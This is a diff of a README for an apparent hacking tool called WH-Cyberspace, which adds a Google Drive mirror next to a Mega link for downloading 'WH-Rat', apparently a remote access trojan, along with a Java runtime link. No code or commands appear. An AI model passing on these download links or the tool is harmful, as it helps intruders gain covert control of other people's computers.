@@ -10,7 +10,10 @@ Usage of WH-Cyberspace Hacking Tool for attacking targets without prior mutual  
 # if your cpu is 32 bit then you are download it
 ☆ java >  jre [Here]( https://www.oracle.com/java/technologies/javase-jre8-downloads.html?fbclid=IwAR22d1RWiauPFfB1Ei2B-ryUT4tBJGpHQLbimDn07nre2rAkyjHoaORZ4x8 " JAVA JRE")
 
-☆ WH-Rat x86 / 32 bit > [Here]( https://mega.nz/file/IM0THbJB#okXmooZQTmEnpy2k6e0cpCnj_AFu1D01Ef3OMLAgLs0 "WH-Rat x86 / 32 bit")
+☆ WH-Rat x86 / 32 bit > mega drive :[Here]( https://mega.nz/file/IM0THbJB#okXmooZQTmEnpy2k6e0cpCnj_AFu1D01Ef3OMLAgLs0 "WH-Rat x86 / 32 bit")
+
+
+☆ WH-Rat x86 / 32 bit > google drive :[Here]( https://drive.google.com/open?id=1i-0wg7amz0yw4_c0xasnc5id_WbYt1AP "WH-Rat x86 / 32 bit")
 
 # ➰ requirements PKG
 
